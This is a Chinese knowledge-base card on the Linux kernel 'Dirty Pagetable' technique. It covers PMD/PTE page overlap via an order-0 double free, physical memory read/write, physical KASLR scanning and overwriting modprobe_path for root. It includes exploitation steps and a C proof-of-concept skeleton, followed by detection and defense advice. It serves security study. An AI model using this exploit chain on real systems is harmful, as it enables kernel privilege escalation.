---
id: binary-pwn-kernel-dirty-pagetable-pmd-pte-overlap-physical-rw
title: Dirty Pagetable：页表页 double free 制造 PMD/PTE 重叠，用户态任意物理内存读写与物理 KASLR 绕过
type: scenario
domain: binary
path: binary/pwn/kernel
technique: dirty-pagetable-pmd-pte-overlap-physical-rw
tags:
- linux-kernel
- page-table
- pte
- pmd
- pud
- double-free
- physical-memory
- kaslr
- tlb
- exploit-primitive
- cross-cache-alternative
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V157
  verified_at: '2026-11-06T07:38:44+08:00'
  notes: 已对照原文与图核对：PUD/PMD/PTE 均为 order-0 页、PCP refill 拆分、PMD+PTE 重叠、fork+munmap 刷新 TLB、物理 KASLR 扫描与 0x8000000000000867 PTE 标志均与原文一致。注意 CVE-2024-1086 入口实际 double free 的是 order-4 skb 页并经 PCP refill 转 order-0（详见同批 CVE 卡），本卡按通用 Dirty Pagetable 原语抽象为 order-0；未执行 PoC。
url: /docs/binary/pwn/kernel/binary-pwn-kernel-dirty-pagetable-pmd-pte-overlap-physical-rw/
draft: false
kb_aliases:
- Dirty Pagetable
- Dirty Pagedirectory
- 脏页目录
- PMD/PTE 重叠
- 页表页双重分配
- 任意物理内存读写
- fork munmap TLB flush
- 物理 KASLR 绕过
---

## 一句话结论

Linux 的 PUD、PMD、PTE 页都是 order-0 页、来自同一类页分配器；只要能对任意一个 order-0 页造成可靠的 double free，就能让同一个物理页既被分配为某个 PMD 页、又被分配为某个 PTE 页。此后在 PMD 区域对应的用户地址写入 8 字节会改写 PTE 表项，再通过 PTE 区域的用户地址即可读写任意物理页——不需要 cross-cache 攻击中“可被用户数据完全覆盖且与页表同 freelist”的堆对象，直接从用户态获得任意物理内存读写，并可扫描物理 KASLR 与内核目标。

## 原理

- **页表层级**：x86-64 4 级分页为 PGD → PUD → PMD → PTE，每级页 4KB、512 个 8 字节表项；5 级分页多一层 P4D。一个 PTE 表项包含物理页帧号（PFN）和权限位，改写 PTE 就能把任意物理页映射到用户虚拟地址。
- **页表页的分配路径**：`pte_alloc_one()`、`pmd_alloc_one()`、`pud_alloc_one()` 最终都走 `alloc_pages(GFP_PGTABLE_USER/GFP_KERNEL, 0)`，得到 order-0 页，migratetype 为 0（UNMOVABLE）。普通用户数据页通常走 migratetype 1（MOVABLE），所以喷射页表不会与用户数据页抢同一个 freelist，噪声较小。
- **双重分配**：如果漏洞把某个 order-0 页释放了两次，伙伴系统就会把同一个物理页登记两次；先让某个 PTE 页分配到它，再让某个 PMD 页分配到它，两个不同页表层级就指向同一物理页。文章选择 PMD+PTE，因为 PTE 喷射成功率为 100%、PMD 为 50%，比 PUD+PMD（PUD 喷射会同时分配 PMD/PTE，成功率约 33%）更稳。
- **别名关系**：设 PMD 页和 PTE 页是同一物理页，则 `mm->pgd[...]` 中的某个 PMD 表项数组和某个 PTE 表项数组重叠。用户态在 PMD 区域对应虚拟页写入的值，会直接成为 PTE 表项；PTE 区域对应虚拟页的访问则按这个 PTE 解引用物理页。于是“写 PTE”和“用 PTE 读写物理页”都只是普通用户态 load/store。
- **为什么不用 cross-cache**：cross-cache 需要先让页表页被释放、再用一个可完全覆盖的堆对象占住它，且两者必须同 freelist；Dirty Pagetable 反过来利用页表页本身就是“可写 8 字节表项数组”的特性，只要双重分配成功，覆盖和读写都自然成立。
- **PTE 值**：典型值为 `phys_addr | 0x8000000000000867`：低 12 位是 present/rw/user/accessed/dirty 等标志，bit 63 是 NX；PFN 位于 bit 12..51。把 `phys_addr` 换成目标物理页即可映射它；不需要修改内核页表，也不需要内核 ROP。
- **TLB 刷新**：改写 PTE 后旧 TLB 项仍然缓存。文章用 fork：父进程准备一块 `MAP_SHARED|MAP_ANONYMOUS` 状态页，子进程 `munmap(addr, len)` 触发内核刷新并把状态改为完成，父进程自旋等待。这样不修改父进程页表、不依赖 PCID，且完全从用户态发起。
- **物理 KASLR**：`CONFIG_RELOCATABLE=y` 时内核物理基址按 `CONFIG_PHYSICAL_START`（常见 16MB）或 `CONFIG_PHYSICAL_ALIGN`（常见 2MB）对齐；8GB 内存只有 512（或 4096）个候选。每次 PTE 覆写可覆盖 512 个页，检查每个候选页开头的 `start_64` 代码特征即可锁定物理基址，再用硬编码偏移或 80MB 数据扫描定位 `modprobe_path` 等目标。
- **限制**：需要可靠的 order-0 页 double free；需要能按固定虚拟地址 `mmap` 并触碰页面以分配 PTE/PMD；需要目标未启用会阻止页表页被重复分配的完整性检查。物理扫描范围与 `CONFIG_PHYSICAL_ALIGN`、内存大小相关。

## 触发条件

- 存在可对 order-0 页（尤其是页表页）造成 double free 的内核漏洞，或其它能让同一物理页被两个页表层级同时引用的原语。
- double free 能绕过 freelist hardening/refcount 检测（通常需要先用同尺寸对象占位，或选择页分配器而非 slab 的路径）。
- 攻击者能 `mmap(MAP_FIXED|MAP_SHARED|MAP_ANONYMOUS)` 指定虚拟地址，并通过读写触碰页面触发 PUD/PMD/PTE 分配。
- 目标为 4 级或 5 级分页；`CONFIG_PAGE_TABLE_CHECK` 等页表完整性检查未启用或可绕过。
- 有足够物理内存进行 KASLR 扫描（文章示例 8GB；扫描目标约 80MB）。

## 利用步骤

1. 选定三段虚拟地址：PTE 喷射区 `PTI_TO_VIRT(2, 0, i, 0, 0)`、PMD 区 `PTI_TO_VIRT(1, 1, 0, 0, 0)`（0x400000），以及 PUD/PMD 预分配区；用 `mmap(MAP_FIXED|MAP_SHARED|MAP_ANONYMOUS)` 建立 VMA。
2. 预先触碰部分页面，分配 PUD/PMD/PTE，固定布局并减少后续分配噪声。
3. 排空目标 CPU 的 PCP 列表，制造 order-0 页的 double free（例如 CVE-2024-1086 的 skb 页 double free）。
4. 喷射 PTE：遍历 PTE 喷射区并写 0x41，每次触碰分配一个 PTE 页；其中一个 PTE 页会落在被 double free 的物理页上。
5. 分配 PMD：触碰 PMD 区，让一个 PMD 页分配到同一物理页；检查 PTE 区里原本的 0x41 是否被 PMD 表项覆盖（例如变成非 0x41 的值）以确认重叠。
6. 在 PMD 区的用户页写入 PTE 值 `pte_area[j] = phys_addr | 0x8000000000000867`；如果 PMD 区首项对应 PTE 表首项，则 PTE 区对应虚拟页现在映射 `phys_addr`。
7. `flush_tlb(_pmd_area, 0x400000)`：fork 子进程 `munmap` 目标范围，父进程等待共享状态。
8. 通过 PTE 区虚拟地址读取/写入目标物理页；按 `CONFIG_PHYSICAL_ALIGN` 枚举物理基址候选，用内核代码特征匹配，再扫描目标数据结构。
9. 定位并覆盖 `modprobe_path`、`core_pattern` 或其它 root 可控路径，触发内核以 root 执行脚本。

## PoC

原文的完整 exploit 见 CVE-2024-1086 卡；下面是与具体漏洞解耦的最小 Dirty Pagetable 骨架：

```c
#define _pte_index_to_virt(i) ((unsigned long long)(i) << 12)
#define _pmd_index_to_virt(i) ((unsigned long long)(i) << 21)
#define _pud_index_to_virt(i) ((unsigned long long)(i) << 30)
#define _pgd_index_to_virt(i) ((unsigned long long)(i) << 39)
#define PTI_TO_VIRT(pud, pmd, pte, page, byte) \
    ((void*)(_pgd_index_to_virt(pud) + _pud_index_to_virt(pmd) + \
             _pmd_index_to_virt(pte) + _pte_index_to_virt(page) + (byte)))

static void flush_tlb(void *addr, size_t len) {
    short *status = mmap(NULL, sizeof(short), PROT_READ | PROT_WRITE,
                         MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    *status = FLUSH_INPROGRESS;
    if (fork() == 0) {
        munmap(addr, len);
        *status = FLUSH_DONE;
        sleep(9999);
    }
    while (*status == FLUSH_INPROGRESS) ;
    munmap(status, sizeof(short));
}

/* 1) 预留 VMA 并预分配页表 */
mmap(PTI_TO_VIRT(1, 0, 0, 0, 0), 0x2000, PROT_READ|PROT_WRITE,
     MAP_FIXED|MAP_SHARED|MAP_ANONYMOUS, -1, 0);
for (i = 0; i < PTE_SPRAY; i++)
    mmap(PTI_TO_VIRT(2, 0, i, 0, 0), 0x2000, PROT_READ|PROT_WRITE,
         MAP_FIXED|MAP_SHARED|MAP_ANONYMOUS, -1, 0);
*(char*)PTI_TO_VIRT(2, 0, 0, 0, 0) = 0x41;   /* 触发 PTE 分配 */

/* 2) 制造 order-0 页 double free（由具体漏洞提供），排空 PCP，喷射 PTE */
for (i = 0; i < PTE_SPRAY; i++)
    *(char*)PTI_TO_VIRT(2, 0, i, 0, 0) = 0x41;

/* 3) 分配 PMD，检测重叠 */
unsigned long long *pte_area = NULL;
for (i = 0; i < PTE_SPRAY; i++) {
    unsigned long long *p = PTI_TO_VIRT(2, 0, i, 0, 0);
    if (*p != 0x41) { pte_area = p; break; }
}

/* 4) 改写 PTE 指向目标物理页 */
pte_area[0] = 0x8000000000000867ULL;          /* 物理 0，带 present/rw/user/NX */
flush_tlb(PTI_TO_VIRT(1, 1, 0, 0, 0), 0x400000);
/* 现在通过 PTI_TO_VIRT(2, 0, i, 0, 0) 读写物理页 0 */

/* 5) 扫描物理内核基址与 modprobe_path */
for (k = 0; k < PHYS_MEM / (PHYS_ALIGN * 512); k++) {
    for (j = 0; j < 512; j++)
        pte_area[j] = (k * PHYS_ALIGN * 512 + PHYS_ALIGN * j) | 0x8000000000000867ULL;
    flush_tlb(pmd_area, 0x400000);
    for (j = 0; j < 512; j++)
        if (is_kernel_base(pmd_kernel_area + j * 0x1000)) { /* 记录候选 */ }
}
```

原文在 linux-5.15.1 上以 CVE-2024-1086 为入口完成整条链；本卡不执行 PoC，PTE 标志、虚拟地址布局和物理对齐需按目标内核/编译配置核对。

## 变体与关联

- **PMD+PTE（推荐）**：PTE 喷射命中率 100%，PMD 50%；实现简单、噪声低。
- **PUD+PMD**：可一次覆盖更大范围，但 PUD 喷射会级联分配 PMD/PTE，三选一命中，成功率约 33%，且更容易扰动布局。
- **5 级分页**：多一个 P4D 层，`PTI_TO_VIRT` 的位移要相应增加；页表页仍为 order 0。
- **2MB 大页变体**：把 PMD 表项直接指向 2MB 物理块，可减少 PTE 层；但需要目标支持且布局不同。
- **入口漏洞**：CVE-2024-1086 的 nf_tables double free 是最典型的入口；其它能对 order-0 页 double free 的内核漏洞也可复用本技术。
- 关联：[[binary-pwn-kernel-cve-2024-1086-nft-verdict-double-free-dirty-pagetable-modprobe]]（完整落地）、[[binary-pwn-kernel-cve-2026-23271-perf-event-race-uaf-core-pattern-lpe]]（另一种内核 UAF → 提权）、[[binary-pwn-kernel-cve-2026-31431-page-cache-poisoning-lpe]]（物理页/页缓存写对照）。

## 检测与防御

- **页表完整性**：启用 `CONFIG_PAGE_TABLE_CHECK`（Linux 6.6+ 一类）可在页表页被非法改写/重复分配时检测并报错；`CONFIG_DEBUG_VM`、KASAN/KFENCE 可在测试环境提前暴露 double free。
- **漏洞修复**：根本仍是消除页表页 double free；修复 nf_tables 等入口后，Dirty Pagetable 失去原料。
- **攻击面**：限制 unprivileged user namespace 与 netfilter 管理权限；容器使用 seccomp 阻断 `unshare`/`nft` 相关系统调用。
- **物理 KASLR**：`CONFIG_RANDOMIZE_MEMORY`、更大的物理随机化范围只能增加扫描成本；SMEP/SMAP 不能阻止本技术，因为它修改的是用户页表。
- **检测**：内核日志中的页表页 refcount/double free 报告；异常的 `fork`+`munmap` TLB 刷新模式；用户进程在极短时间内读取大量物理页；`modprobe_path`/`core_pattern` 被改为 `/proc/*/fd/*`。
- **虚拟化/硬件**：在支持的内存完整性/页表隔离环境中运行不可信负载，可提高利用门槛；但仍需及时打补丁。
